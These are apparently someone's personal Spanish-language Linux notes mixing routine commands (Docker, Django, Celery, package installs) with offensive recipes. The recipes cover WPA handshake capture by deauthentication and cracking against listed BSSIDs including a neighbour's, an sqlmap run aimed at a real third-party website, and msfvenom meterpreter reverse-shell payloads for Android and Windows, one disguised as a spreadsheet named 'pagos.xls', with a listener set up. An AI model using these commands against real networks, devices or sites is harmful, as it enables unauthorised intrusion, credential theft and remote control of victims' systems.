# Linux
Comandos generales de Linux

Actualizacion del sistema operativo
sudo apt-get update && sudo apt-get upgrade

# Instalacion de git
sudo apt-get install git

# Uso de NANO BASH
ctrl + O => para poder guardar

ctrl + s => guardar informacion

ctrl + w => Buscar texto en particular

ctrl + x => para salir

alt + a y flechas para marcar texto, desmarcar alt + a

copiar crtl + shift + c 

pegar crtl + shift + v


# Htop

# Para control de datos de la red

aptitude search nethogs
sudo apt install nethogs
nethogs


# Discos en Linux

sda
sdb
sd0 o sr0


# Airmon

sudo airmon-ng

airmon-ng start wlan0

airodump-ng wlan0

airodump-ng --bssid 1C:B0:44:BF:33:45 --channel 11 wlan0

# Nmap


ifconfig

ping 192.168.1.91

nmap -sP 192.168.1.0/24 => es desde 0/24.
Con eso saco las IP conectadas a la red

nmap -sT -p 80,443 nmap 192.168.1.0/24 => es desde 0/24

nmap -sS -p 80,443 nmap 192.168.1.0/24 => es desde 0/24

nmap -sT (IP)

nmap -O (IP)

nmap -A (IP)

nmap -p- -sV (IP)
Se escanean los 65.535 puertos.
Con esto obtengo las debilidades que son posible de explotar

searchsploit (se pega el programa obtenido en el paso anterior)
se busca si tiene algun backdoor con metaexploit

nmap --script vuln IP

ip iphone 192.168.1.83

min 10:00 Nmap tutorial to find networks vulnerabilities


# Comandos generales

man ls => Ayuda del comando

ls -l -a

pwd

cd /

uname -i

cd

ls --file-type

ls --file-type -a -l

ls -a -l -R => busqueda recursiva y con informacion completa

ls -h -l -R. Vista de archivos recursivas, vista humana y que muestre los permisos

cat,less XXXXX.XXX => Para abir archivos

rm -d dirname => To remove one or more empty directories use the -d option

sudo rm -rvi app/ => If you want rm to ask you to confirm before deleting every directories and files

Para seleccionar la impresion de una linea segun string d euna linea se ocupa grep, ej: ifconfig | grep broadcast

Para seleccionar una posicion de esa linea se utiliza awk {print$2}

Para crear alias ipaddress="ifconfig | grep broadcast | awk '{print $2}'"

alias ipaddress="echo $(ifconfig | grep broadcast | awk '{print $2}')"

# Control de procesos

ps aux | more

ps aux

## Instalando TOP

sudo apt-get install htop

ejecutar htop

# Comandos para inspeccionar el PC
LSUSB => USB dispoibles
LSUSB -v
LSMOD => /proc/modules

DMESG
DMIDECODE

# Airmon
iwconfig => Mode:Managed, esto debe ser cambiado a modo monitor
la tarjeta debe estar en estado monitor
ifconfig wlan0
ifconfig wlan0 down => para dejar la tarjeta en modo monitor
airmon-ng check kill => congela todos los proceso de la tarjeta
airmon-ng start wlan0 => para comenzar el proceso, en modo monitor
iwconfig => confirmar que la tarjeta este en monitor mode
el adaptador debe soportar el modo de monitor
en monitor mode
airodump-ng wlan0 => Monitoreo de redes
airodump-ng -c1 -w capture -d BSSID wlan0 => the objective is knock station (access point) and achive the handshacke
guardando esta informacion en el archivo capture.cap
En segundo terminal colocar la siguiente linea
aireplay-ng --deauth 0 -a BSSID -c STATION wlan0 => Para hacer el handshake
Saldra PMKID found
Despues WPA Handshake

ls
el archivo mas importante es capture.cap
wireshark nombre archivo
filtrar por eapol

airmon-ng stop wlan0
iwconfig
Para aplicar al dictionary
aircrack-ng capture-01.cap -w /usr/share/dict/wordlist-probable.txt
Probar con rockyou.txt, que se encuentra en /usr/share/wordlists/
Antes se debe descomprimir con gzip -d rockyou.txt.gz

Atacando al 810 =>7C:DB:98:E2:95:FC CH1
Atacando a la vecina => 18:70:3B:E6:FF:53 CH7
airodump-ng wlan0 => para rescatar BSSID y chanel

# Instalar screenfetch
sudo apt-get install screenfetch
screenfetch

# Instalar Python
https://www.python.org/downloads/source/
Donwload Linux, Gzipped.
Una vez bajado, extraer.
Dentro de la carpeta Python "./configure"
Despues script "make"
Despues script "make install"

# Instalar ATOM
Bajar: https://atom.io/ .deb
dpkg -i atom-amd64(1).deb
sudo apt --fix-broken install
sudo apt install -f

# Instalar GIT
apt install git
una vez instalado se puede ocupar "git clone URL", para bajar cualquier repositorio


# Configure bash alieses
nano -/.bash_aliases
open nano
alias hackwifi='besside-ng wlan0'
Ctrl + S
Y
enter
hackwifi

Para actualizar el paquete de instalacion
sudo apt install

# Arch
pacman -Syu
https://wiki.archlinux.org/title/System_maintenance#Upgrading_the_system

Use pacman -Qtd to check for packages that were installed as a dependency but now, no other packages depend on them. If an orphaned package is still needed, it is recommended to change the installation reason to explicit. Otherwise, if the package is no longer needed, it can be removed. 



# Para saber la arquitectura de un Linux
uname –m\
x86_64 = > es el correcto, 64 bits\
If the response is i686, you have a 32-bit version of Linux.\
If the response is x86_64, you have a 64-bit version of Linux.\
uname –a\
You can find out more detail about your particular installation of Linux, like your kernel version, by entering\
Se debe instalar Kali Linux para 64 bits\

Linux kali 5.9.0-kali1-686-pae #1 SMP Debian 5.9.1-1kali2 (2020-10-29) i686 GNU/Linux\
i686\


# SQLMAP
└─$  sqlmap -u https://www.realfitness.cl/detalle-producto.php?id=2 --dbs                                         127 ⨯ 3 ⚙

https://www.creadpag.com/2018/05/inyeccion-sql-en-kali-linux-usando.html
http://achap.cl/festival_2017/ganadores_categoria.php?id=4



## Uso de Nano Bash

Para comenzar un archivo @nano XXXX.sh\
Para ejecturar el archivo @bash XXXX.sh\
Para editar un archivo se ocupa el editor de texto nano\
Para guardar el archivo se aprieta Ctrl + X, despues Yes\
Para declarar una variable en un string puede ser con read o anteponiendo el signo $



# Payload para Android

https://spyboy.blog/2020/11/08/how-hackers-remotely-hack-android-using-payload/

https://hackingtoots.wordpress.com/2020/05/12/how-to-make-android-payload-using-msfvenom/

https://codepre.com/quick-guide-how-to-hack-android-with-kali-linux.html

https://spyboy.blog/2020/05/29/how-hackers-hack-android-using-metasploit-over-lan-wan/

https://spyboy.blog/2020/11/08/how-hackers-remotely-hack-android-using-payload/

https://www.androidgigs.com/how-to-hack-android-phone-remotely/

https://www.androidgigs.com/how-to-hack-android-phone-remotely/

# Instalando el metasploit
sudo apt-get install metasploit-framework

msfvenom -h

gem install bundle

bundle install

gem update --system

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.91 LPORT=4444 -o payloadname.apk  => Creando el payload

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.91 LPORT=4444 -o pagos.xls => otro payload

# En otra consola

msfconsole => Se corre en otra consola

use exploit/multi/handler

set LHOST 192.168.1.91



# Celery
1)	“django-admin.py startproject src”. Para comenzar haciendo la carpeta de configuración

2)	Para el proyecto se debe crear base de datos, q por omision en django funciona con SQL.

3)	Para crear base de datos. “python manage.py migrate”

4)	Django tiene un servidor de prueba, para turn on se debe escribir “python manage.py runserver”

5)	Una vez iniciado el servidor, da el ip y puerto.

6)	Crear primera vista y confgurar el URL

7)	Se arregla el 

8)	Peticion => Request, crea objeto HTTP Request, asociado a la función vista

9)	Respuesta => HTTPResponse

10)	url.py genera listado de URL a ser vistas, se genera dentro de la tupla. Aquí se generan las rutas


# Celery

django-admin.py startproject django_email_celery  Para crear el projecto
python manage.py startapp example  Para crear carpeta example
python manage.py runserver [en la misma carpeta manager]

El puesto 19960 esta ocupado, por lo que se cambiara de puerto
Para esto se ocupo netstat -a -n -o |find “54”
Y se confirmo con Putty, opción Telnet, localhost, puerto 19960
 

Para corrrer Celery en cmd de la carpeta
celery -A django_email_celery worker -l info
 
# Test Cornershop

Para instalar todas las librerias segur requirements.txt

pip install -r requirements.txt

https://note.nkmk.me/en/python-pip-install-requirements/

python manage.py runserver 0.0.0.0:8000

Para ver en detalle una librería

pip show isort

Se rebaja version de isort

isort==4.3.21

Crear grupo y usuario (este paso no es necesario)

Sudo useradd cornershop

Sudo groupadd cornershop

Docker PS 
Docker exec -it (ID container) bash (joins already container is bash prompt)
pwd /opt/cornershop debe estar en /opt/cornershop/backend_test
celery -A backend_test worker -i info




# Historial

python manage.py runserver 0.0.0.0:8000

Instalo Docker Toolbox, debido a que es para Windows menor a V10.

# Instalacion de Docker en Linux

Sudo apt install Docker.io

Docker images => muestas las imágenes que estan instaladas

Docker pull ubuntu => baja la imagen llamada ubuntu

Docker ps => muestra los contenedores (proceso) que se ejecuta, lista de containers

Docker ps -a => muestra los contenedores detenidos

Docker ps -a1 => muestra los ID contenedores detenidos

Docker exec -it (ID container)

Docker run ubuntu => corre la imagen ubuntu

Docker run ubuntu -it bash => Correr imagen ubuntu, de forma interactive (-it), con el programa bash

Desde una imagen se puede ejecutar multiples contenedores (procesos) desde solo una imagen

Docker rm ID=> para eliminar el proceso


# Docker en Linux

Todos los comandos de Docker se corren con SUDO

Se debe instalar Docker desde la consola

Pagina especial para instalar Docker desde la consola

Para Kali Linux es una instalación especial que esta en linuxhint.com/install_docker_kali_linux

Si todo sale bien debe probarse por medio de Docker verion o sudo Docker run hello-world

Despues se debe a ver el “Post—installation steps for Linux” para instalar sacar el sudo de los comandos dockers
 
# Memoria Swap

Aumento de la memoria 

Swappiness puede tener un valor entre 0 y 100, pero por defecto se utiliza 60. Hay que aclarar que este valor puede no ser igualmente eficaz en todos los casos, ya que dependerá del uso individual, las especificaciones del hardware o las necesidades del usuario. 

Cuanto mayor sea el valor del parámetro swappiness, más agresivamente el kernel utilizará swap. Por ello, se recomienda utilizar un valor bajo que reduzca el intercambio desde RAM y mejore la capacidad de respuesta del sistema (rendimiento global, funcionalidad y velocidad del sistema operativo).

# Operacion con archivo Make

make -f Makefile

make up

Faltaba instalar docker compose, para comprobar Docker-compose --version

https://docs.docker.com/compose/install/

# Operacion con Celery

find / -name django-admin => para ver donde fue instalado el django-admin

### Ruta con la cual debemos agregar cada corrida
/home/ngempin/.local/bin/django-admin 

/home/ngempin/.local/bin/django-admin startproject celery_example

This is likely because you either used the --user option to pip 
install, or you set up pip in such a way that it automatically does 
that. Hence, everything gets installed in $HOME/.local. You may want
to add $HOME/.local/bin to your $PATH for the future.

### Para comenzar el proyecto
django-admin startproject celery_example

### Para crear la carpeta
python manage.py migrate

### Para crear la app
Para levantar la app python  manage.py startapp app , este paso se debe confirmar ya que se crea una carpeta llamada app

### Para levantar el servidor
python manage.py runserver 0.0.0.0:8000

### Para levantar el celery work -A

/home/ngempin/.local/bin/celery -A backend_test worker -l info

find /home -iname or -name celery, este comando es para buscar archivos segun el nombre

Para navegar se puede utilizar w3m http://127.0.0.1:8000/



